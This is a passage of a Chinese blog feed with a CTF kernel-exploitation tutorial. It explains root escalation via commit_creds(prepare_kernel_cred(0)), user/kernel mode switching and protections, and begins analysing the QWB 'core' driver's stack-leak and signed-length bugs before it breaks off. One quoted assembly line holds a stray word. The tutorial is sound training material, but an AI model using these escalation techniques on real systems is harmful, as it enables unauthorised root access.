    
      &lt;p&gt;兴致满满地开始比赛，骂骂咧咧地结束比赛，这个不给libc也太难受了。全程下来只做了一个Boom1，另外两个被队里TTX大哥做了。赛后看了下Boom2，也挺简单的，但是faster0是个AutoPwn，之前的De1CTF有个code runner应该也是类似的，暂且先记录一下大佬的wp，以后学习。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Competition" scheme="https://n0nop.com/categories/Competition/"/>
    
    
      <category term="CTF" scheme="https://n0nop.com/tags/CTF/"/>
    
      <category term="pwn" scheme="https://n0nop.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>kernel pwn: ROP</title>
    <link href="https://n0nop.com/2020/05/06/kernel-pwn-ROP/"/>
    <id>https://n0nop.com/2020/05/06/kernel-pwn-ROP/</id>
    <published>2020-05-05T16:51:09.000Z</published>
    <updated>2020-05-13T02:07:32.953Z</updated>
    
    <content type="html"><![CDATA[<p>早就该学习kernel pwn，否则得被时代抛弃了。先从简单的入手吧，<del>复现几道以前的ROP赛题</del>目前只找到强网杯的题目，顺便从中学习一点kernel的基础知识。</p><a id="more"></a><h1 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h1><h2 id="Kernel提权"><a href="#Kernel提权" class="headerlink" title="Kernel提权"></a>Kernel提权</h2><p>目前看到的主要是通过一下调用进行提权（应该还有更复杂的提权方法）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br></pre></td></tr></table></figure><p>其中<code>perpare_kernel_cred</code>函数的定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * prepare_kernel_cred - Prepare a set of credentials for a kernel service</span></span><br><span class="line"><span class="comment"> * @daemon: A userspace daemon to be used as a reference</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Prepare a set of credentials for a kernel service.  This can then be used to</span></span><br><span class="line"><span class="comment"> * override a task's own credentials so that work can be done on behalf of that</span></span><br><span class="line"><span class="comment"> * task that requires a different subjective context.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @daemon is used to provide a base for the security record, but can be NULL.</span></span><br><span class="line"><span class="comment"> * If @daemon is supplied, then the security data will be derived from that;</span></span><br><span class="line"><span class="comment"> * otherwise they'll be set to 0 and no groups, full capabilities and no keys.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The caller may change these controls afterwards if desired.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Returns the new credentials or NULL if out of memory.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Does not take, and does not return holding current-&gt;cred_replace_mutex.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">struct cred *<span class="title">prepare_kernel_cred</span><span class="params">(struct task_struct *daemon)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> = kmem_cache_alloc(cred_jar, GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">new</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">kdebug(<span class="string">"prepare_kernel_cred() alloc %p"</span>, <span class="keyword">new</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (daemon)</span><br><span class="line">old = get_task_cred(daemon);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">old = get_cred(&amp;init_cred);</span><br><span class="line"></span><br><span class="line">validate_creds(old);</span><br><span class="line"></span><br><span class="line">*<span class="keyword">new</span> = *old;</span><br><span class="line">atomic_set(&amp;<span class="keyword">new</span>-&gt;usage, <span class="number">1</span>);</span><br><span class="line">set_cred_subscribers(<span class="keyword">new</span>, <span class="number">0</span>);</span><br><span class="line">get_uid(<span class="keyword">new</span>-&gt;user);</span><br><span class="line">get_user_ns(<span class="keyword">new</span>-&gt;user_ns);</span><br><span class="line">get_group_info(<span class="keyword">new</span>-&gt;group_info);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line"><span class="keyword">new</span>-&gt;session_keyring = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">new</span>-&gt;process_keyring = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">new</span>-&gt;thread_keyring = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">new</span>-&gt;request_key_auth = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">new</span>-&gt;jit_keyring = KEY_REQKEY_DEFL_THREAD_KEYRING;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line"><span class="keyword">new</span>-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">if</span> (security_prepare_creds(<span class="keyword">new</span>, old, GFP_KERNEL) &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line">put_cred(old);</span><br><span class="line">validate_creds(<span class="keyword">new</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span>;</span><br><span class="line"></span><br><span class="line">error:</span><br><span class="line">put_cred(<span class="keyword">new</span>);</span><br><span class="line">put_cred(old);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注释中已经把函数功能描述得很具体了，简单来说，这个函数主要是生成一个<code>cred</code>结构体，主要根据传入的参数<code>struct task_struct *daemon</code>来确定一些内核服务的credentials，以便于给当前task提供在特定的context执行的权限。<br><br>在参数为NULL的情况下，也其实就是理解为把0号进程的<code>task_struct</code>作为参数的情况下，返回一个相应的<code>cred</code>结构体，这个结构体具有最高的root权限。<br>而<code>commit_creds</code>函数定义为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * commit_creds - Install new credentials upon the current task</span></span><br><span class="line"><span class="comment"> * @new: The credentials to be assigned</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Install a new set of credentials to the current task, using RCU to replace</span></span><br><span class="line"><span class="comment"> * the old set.  Both the objective and the subjective credentials pointers are</span></span><br><span class="line"><span class="comment"> * updated.  This function may not be called if the subjective credentials are</span></span><br><span class="line"><span class="comment"> * in an overridden state.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This function eats the caller's reference to the new credentials.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Always returns 0 thus allowing this function to be tail-called at the end</span></span><br><span class="line"><span class="comment"> * of, say, sys_setgid().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">commit_creds</span><span class="params">(struct cred *<span class="keyword">new</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">task</span> = <span class="title">current</span>;</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span> = <span class="title">task</span>-&gt;<span class="title">real_cred</span>;</span></span><br><span class="line"></span><br><span class="line">kdebug(<span class="string">"commit_creds(%p&#123;%d,%d&#125;)"</span>, <span class="keyword">new</span>,</span><br><span class="line">       atomic_read(&amp;<span class="keyword">new</span>-&gt;usage),</span><br><span class="line">       read_cred_subscribers(<span class="keyword">new</span>));</span><br><span class="line"></span><br><span class="line">BUG_ON(task-&gt;cred != old);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">BUG_ON(read_cred_subscribers(old) &lt; <span class="number">2</span>);</span><br><span class="line">validate_creds(old);</span><br><span class="line">validate_creds(<span class="keyword">new</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">BUG_ON(atomic_read(&amp;<span class="keyword">new</span>-&gt;usage) &lt; <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">get_cred(<span class="keyword">new</span>); <span class="comment">/* we will require a ref for the subj creds too */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* dumpability changes */</span></span><br><span class="line"><span class="keyword">if</span> (!uid_eq(old-&gt;euid, <span class="keyword">new</span>-&gt;euid) ||</span><br><span class="line">    !gid_eq(old-&gt;egid, <span class="keyword">new</span>-&gt;egid) ||</span><br><span class="line">    !uid_eq(old-&gt;fsuid, <span class="keyword">new</span>-&gt;fsuid) ||</span><br><span class="line">    !gid_eq(old-&gt;fsgid, <span class="keyword">new</span>-&gt;fsgid) ||</span><br><span class="line">    !cred_cap_issubset(old, <span class="keyword">new</span>)) &#123;</span><br><span class="line"><span class="keyword">if</span> (task-&gt;mm)</span><br><span class="line">set_dumpable(task-&gt;mm, suid_dumpable);</span><br><span class="line">task-&gt;pdeath_signal = <span class="number">0</span>;</span><br><span class="line">smp_wmb();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* alter the thread keyring */</span></span><br><span class="line"><span class="keyword">if</span> (!uid_eq(<span class="keyword">new</span>-&gt;fsuid, old-&gt;fsuid))</span><br><span class="line">key_fsuid_changed(task);</span><br><span class="line"><span class="keyword">if</span> (!gid_eq(<span class="keyword">new</span>-&gt;fsgid, old-&gt;fsgid))</span><br><span class="line">key_fsgid_changed(task);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* do it</span></span><br><span class="line"><span class="comment"> * RLIMIT_NPROC limits on user-&gt;processes have already been checked</span></span><br><span class="line"><span class="comment"> * in set_user().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">alter_cred_subscribers(<span class="keyword">new</span>, <span class="number">2</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">new</span>-&gt;user != old-&gt;user)</span><br><span class="line">atomic_inc(&amp;<span class="keyword">new</span>-&gt;user-&gt;processes);</span><br><span class="line">rcu_assign_pointer(task-&gt;real_cred, <span class="keyword">new</span>);</span><br><span class="line">rcu_assign_pointer(task-&gt;cred, <span class="keyword">new</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">new</span>-&gt;user != old-&gt;user)</span><br><span class="line">atomic_dec(&amp;old-&gt;user-&gt;processes);</span><br><span class="line">alter_cred_subscribers(old, <span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* send notifications */</span></span><br><span class="line"><span class="keyword">if</span> (!uid_eq(<span class="keyword">new</span>-&gt;uid,   old-&gt;uid)  ||</span><br><span class="line">    !uid_eq(<span class="keyword">new</span>-&gt;euid,  old-&gt;euid) ||</span><br><span class="line">    !uid_eq(<span class="keyword">new</span>-&gt;suid,  old-&gt;suid) ||</span><br><span class="line">    !uid_eq(<span class="keyword">new</span>-&gt;fsuid, old-&gt;fsuid))</span><br><span class="line">proc_id_connector(task, PROC_EVENT_UID);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!gid_eq(<span class="keyword">new</span>-&gt;gid,   old-&gt;gid)  ||</span><br><span class="line">    !gid_eq(<span class="keyword">new</span>-&gt;egid,  old-&gt;egid) ||</span><br><span class="line">    !gid_eq(<span class="keyword">new</span>-&gt;sgid,  old-&gt;sgid) ||</span><br><span class="line">    !gid_eq(<span class="keyword">new</span>-&gt;fsgid, old-&gt;fsgid))</span><br><span class="line">proc_id_connector(task, PROC_EVENT_GID);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* release the old obj and subj refs both */</span></span><br><span class="line">put_cred(old);</span><br><span class="line">put_cred(old);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从注释里也可以看到，这个函数的功能就是给当前task写入新的<code>cred</code>的结构体，从而改变了当前task的权限。<br><br>配合通过<code>prepare_kernel_cred(0)</code>得到的root权限的<code>cred</code>结构体，从而赋予当前task同样的root权限，这样就完成了提权。</p><h2 id="状态切换"><a href="#状态切换" class="headerlink" title="状态切换"></a>状态切换</h2><p>我们知道当进行一些系统调用，或者产生某些异常，或发生外部中断的时候，需要从用户态切换到内核态，再去执行一些内核的相关操作。而从内核态执行返回的时候，同样需要切换回用户态再去执行用户代码。<br><br>而具体的切换的过程为：</p><ol><li>从用户态到内核态：<ol><li>通过<code>swapgs</code>切换<code>GS</code>段寄存器，将<code>GS</code>寄存器值和一个特定位置的值进行交换，目的是保存<code>GS</code>值，同时将该位置的值作为内核执行时的<code>GS</code>值使用</li><li>将当前栈顶（用户空间栈顶）记录在 CPU 独占变量区域里，将 CPU 独占区域里记录的内核栈顶放入 rsp/esp。</li><li>通过push保存各寄存器值:  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">ENTRY(entry_SYSCALL_64)</span><br><span class="line"><span class="comment">/* SWAPGS_UNSAFE_STACK是一个宏，x86直接定义为swapgs指令 */</span></span><br><span class="line">SWAPGS_UNSAFE_STACK</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 保存栈值，并设置内核栈 */</span></span><br><span class="line">movq %rsp, PER_CPU_VAR(rsp_scratch)</span><br><span class="line">movq PER_CPU_VAR(cpu_current_top_of_stack), %rsp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 通过push保存寄存器值，形成一个pt_regs结构 */</span></span><br><span class="line"><span class="comment">/* Construct struct pt_regs on stack */</span></span><br><span class="line">pushq  $__USER_DS      <span class="comment">/* pt_regs-&gt;ss */</span></span><br><span class="line"><span class="function">pushq  <span class="title">PER_CPU_VAR</span><span class="params">(rsp_scratch)</span>  <span class="comment">/* pt_regs-&gt;sp */</span></span></span><br><span class="line">pushq  %r11             /* pt_regs-&gt;flags */</span><br><span class="line">pushq  $__USER_CS      <span class="comment">/* pt_regs-&gt;cs */</span></span><br><span class="line">pushq  %rcx             <span class="comment">/* pt_regs-&gt;ip */</span></span><br><span class="line">pushq  %rax             <span class="comment">/* pt_regs-&gt;orig_ax */</span></span><br><span class="line">pushq  %rdi             <span class="comment">/* pt_regs-&gt;di */</span></span><br><span class="line">pushq  %rsi             <span class="comment">/* pt_regs-&gt;si */</span></span><br><span class="line">pushq  %rdx             <span class="comment">/* pt_regs-&gt;dx */</span></span><br><span class="line">pushq  %rcx tuichu    <span class="comment">/* pt_regs-&gt;cx */</span></span><br><span class="line">pushq  $-ENOSYS        <span class="comment">/* pt_regs-&gt;ax */</span></span><br><span class="line">pushq  %r8              <span class="comment">/* pt_regs-&gt;r8 */</span></span><br><span class="line">pushq  %r9              <span class="comment">/* pt_regs-&gt;r9 */</span></span><br><span class="line">pushq  %r10             <span class="comment">/* pt_regs-&gt;r10 */</span></span><br><span class="line">pushq  %r11             <span class="comment">/* pt_regs-&gt;r11 */</span></span><br><span class="line">sub $(<span class="number">6</span>*<span class="number">8</span>), %rsp      <span class="comment">/* pt_regs-&gt;bp, bx, r12-15 not saved */</span></span><br></pre></td></tr></table></figure><ol><li>通过汇编指令判断是否为x32_abi</li><li>通过系统调用号，跳到全局变量<code>sys_call_table</code>相应位置继续执行系统调用。</li></ol></li></ol></li><li>从内核态到用户态<ol><li>通过<code>swapgs</code>恢复<code>GS</code>值</li><li>通过<code>sysretq</code>或者<code>iretq</code>恢复到用户控件继续执行。如果使用<code>iretq</code>还需要给出用户空间的一些信息（<code>CS</code>, <code>eflags/rflags</code>, <code>esp/rsp</code>）等。<h2 id="ioctl"><a href="#ioctl" class="headerlink" title="ioctl"></a>ioctl</h2><code>ioctl</code>也是一个系统调用，用于与设备通信，函数调用的原型是:<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ioctl</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">unsigned</span> <span class="keyword">long</span> request, ...)</span></span>;</span><br></pre></td></tr></table></figure>功能就是打开<code>fd</code>设备，根据<code>request</code>查找相应设备定义的功能，后面就是根据设备功能的具体定义传递相应的参数。<br>至于可以调用的功能，在设备模块中，有相应的<code>ioctl</code>功能定义。</li></ol></li></ol><h2 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h2><p>一般来说，对于一个kernel pwn的题目，通常给以下文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">boot.sh: 一个用于启动kernel的shell的脚本，多用qemu，保护措施与qemu不同的启动参数有关</span><br><span class="line">bzImage: kernel binary</span><br><span class="line">rootfs.cpio: 文件系统映像</span><br><span class="line">vmlinux: 类比成linux pwn中的libc文件（有时不一定提供）</span><br></pre></td></tr></table></figure><p>对于所给文件的进行分析：</p><ol><li>解包文件系统映像（以<code>core.cpio</code>举例）: <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mkdir core # 创建目录core</span><br><span class="line">mv core.cpio ./core/core.cpio.gz # 重命名core.cpio为core.cpio.gz从而进行后续解压操作</span><br><span class="line">gunzip core.cpio.gz # 解包得到core.cpio(ASCII cpio archive)</span><br><span class="line">cpio -idmv &lt; core.cpio  # cpio为归档工具，"i", "d", "m", "v"参数分别表示：</span><br><span class="line">                        # -i: (extract)指定运行为copy-in模式，即目录拷贝模式</span><br><span class="line">                        # -d: 在需要的地方创建目录</span><br><span class="line">                        # -m: 保留文件原始的修改时间</span><br><span class="line">                        # -v: 在屏幕上打印出相关信息</span><br></pre></td></tr></table></figure></li><li>解包后的重要文件（以强网杯core为例）: <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">core.ko # 含有漏洞的目标驱动文件（一般来说都会提供一个含有漏洞的模块）</span><br><span class="line">gen_cpio.sh # 用来打包的脚本，将解包出的文件重新打包为core.cpio</span><br><span class="line">            # shell脚本内容是：find . -print0 | cpio --null -ov --format=newc | gzip -9 &gt; $1</span><br><span class="line">            # 其他题目不一定给，需要自己写</span><br><span class="line">init # kernel启动的初始化文件</span><br></pre></td></tr></table></figure></li></ol><h2 id="保护机制"><a href="#保护机制" class="headerlink" title="保护机制"></a>保护机制</h2><ol><li>smep: <code>Supervisor Mode Execution Protection</code>，当处理器处于<code>ring 0</code>模式，执行用户空间的代码会触发页错误。（在 arm 中该保护称为 PXN)</li><li>smap: <code>Superivisor Mode Access Protection</code>，类似于smep，当处理器处于<code>ring 0</code>模式，访问用户空间的数据会触发页错误。</li><li>MMAP_MIN_ADDR：控制着mmap能够映射的最低内存地址，防止用户非法分配并访问低地址数据。</li><li>kalsr：<code>Kernel Address Space Layout Randomization</code>(内核地址空间布局随机化)，开启后，允许kernel image加载到VMALLOC区域的任何位置。</li></ol><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>一般在启动脚本<code>start.sh</code>中，添加以下内容:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-gdb tcp:port</span><br></pre></td></tr></table></figure><p>或者:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-s # "-gdb tcp:1234"的简写</span><br></pre></td></tr></table></figure><h1 id="强网杯kernel-pwn-core复现"><a href="#强网杯kernel-pwn-core复现" class="headerlink" title="强网杯kernel pwn core复现"></a>强网杯kernel pwn core复现</h1><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>查看驱动模块<code>core.ko</code>的保护，这里显示<code>No PIE</code>是错误的，实际上开了PIE：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x0)</span><br></pre></td></tr></table></figure><p>从<code>start.sh</code>中可以看到开了kaslr，但是没开smep：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr"</span><br></pre></td></tr></table></figure><p><code>ioctl</code>提供了三个功能：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">core_ioctl</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __int64 v3; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">    v3 = a3;</span><br><span class="line">    <span class="keyword">switch</span> ( (_DWORD)a2 )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x6677889B</span>:</span><br><span class="line">        core_read(a3);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x6677889C</span>:</span><br><span class="line">        printk(&amp;unk_2CD, a3);</span><br><span class="line">        off = v3;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x6677889A</span>:</span><br><span class="line">        printk(&amp;unk_2B3, a2);</span><br><span class="line">        core_copy_func(v3);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><code>0x6677889B</code>功能调用<code>core_read</code>，从内核栈<code>&amp;v6+off</code>开始的位置读取0x40 bytes的数据写入到用户空间中： <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 __fastcall core_read(__int64 a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">    __int64 v2; &#x2F;&#x2F; rbx</span><br><span class="line">    __int64 *v3; &#x2F;&#x2F; rdi</span><br><span class="line">    __int64 i; &#x2F;&#x2F; rcx</span><br><span class="line">    unsigned __int64 result; &#x2F;&#x2F; rax</span><br><span class="line">    __int64 v6; &#x2F;&#x2F; [rsp+0h] [rbp-50h]</span><br><span class="line">    unsigned __int64 v7; &#x2F;&#x2F; [rsp+40h] [rbp-10h]</span><br><span class="line"></span><br><span class="line">    v2 &#x3D; a1;</span><br><span class="line">    v7 &#x3D; __readgsqword(0x28u);</span><br><span class="line">    printk(&amp;unk_25B, a2);</span><br><span class="line">    printk(&amp;unk_275, off);</span><br><span class="line">    v3 &#x3D; &amp;v6;</span><br><span class="line">    for ( i &#x3D; 16LL; i; --i )</span><br><span class="line">    &#123;</span><br><span class="line">        *(_DWORD *)v3 &#x3D; 0;</span><br><span class="line">        v3 &#x3D; (__int64 *)((char *)v3 + 4);</span><br><span class="line">    &#125;</span><br><span class="line">    strcpy((char *)&amp;v6, &quot;Welcome to the QWB CTF challenge.\n&quot;);</span><br><span class="line">    result &#x3D; copy_to_user(v2, (char *)&amp;v6 + off, 64LL);</span><br><span class="line">    if ( !result )</span><br><span class="line">        return __readgsqword(0x28u) ^ v7;</span><br><span class="line">    __asm &#123; swapgs &#125;</span><br><span class="line">    return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><code>0x6677889C</code>功能，将<code>off</code>设置为传入的参数，也就是<code>off</code>是可控的：</li><li><code>0x6677889A</code>功能，调用<code>core_copy_func</code>将<code>name</code>的字符串copy到栈上变量<code>v3</code>中，长度由用户态传入的参数控制。这里因为传入的<code>a1</code>参数是有符号的，因此可以通过传入负数绕过<code>a1 &gt; 63</code>的check，而<code>qmemcpy(&amp;v3, &amp;name, (unsigned 